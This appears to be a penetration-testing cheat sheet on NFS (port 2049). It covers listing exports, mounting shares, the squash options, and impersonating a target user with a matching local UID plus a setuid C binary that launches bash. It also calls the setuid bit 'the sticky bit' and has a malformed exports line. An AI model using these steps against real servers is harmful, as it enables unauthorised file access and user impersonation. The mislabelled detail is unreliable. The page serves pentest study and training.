# PORT 2049/tcp - NFS

Network File System is a distributed file system protocol originally developed by Sun Microsystems in 1984, allowing a user on a client computer to access files over a computer network much like local storage is accessed.

## Enumeration

`showmount` gives us the opportunity to know which folder are available for us.

```
showmount -e <IP>
```

## Mounting the folder

We can mount the folder with `mount` command.

```
mount -t nfs [-o vers=2] <IP>:<NFS_FOLDER> <LOCAL_FOLDER> -o nolock
```

## Configuration

The file `/etc/exports` show the NFS configuration applied on the server.

```
$ cat /etc/exports
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt *(rw,sync,root_squash,no_all_squash
```

* `rw`: Means that we can read and write any file on the share.
* `root_squash` (default): Maps all the requests from UID/GID 0 to the anonymous UID/GID.
* `no_root_squash`: All requests from UID/GID 0 are not mapped to the anonymous UID/GID.
* `no_all_squash` (default): Not map all the requests from other UID/GID to the anonymous UID/GID .

{% hint style="info" %}
**Note**: If we have access to the server and a NFS share has this configuration, we can impersonate any user on the attack machine except for the root user.
{% endhint %}

### Impersonate a User (No Root)

So what we’ll do is add the user frank (user to impersonate) on our kali machine and change his id to 1000 (Assigned on the target).

```
❯ useradd frank
❯ cat /etc/passwd | grep frank
frank:x:1000:1000::/home/frank:/bin/sh
```

{% hint style="info" %}
**Note**: You can change any ID by modifying the `/etc/passwd` file.
{% endhint %}

Next step is create a `setuid.c` file:

```
#include <unistd.h>
int main()
{
    setreuid(1000,1000);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

Then compile it:

```
gcc setuid.c -o setuid
```

Set the sticky bit on the file:

```
chmod u+s setuid
```

And execute it on the target machine.

## References

* [https://book.hacktricks.xyz/pentesting/nfs-service-pentesting](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)
* [https://ethicalhackingguru.com/how-to-enumerate-and-exploit-nfs-shares/](https://ethicalhackingguru.com/how-to-enumerate-and-exploit-nfs-shares/)
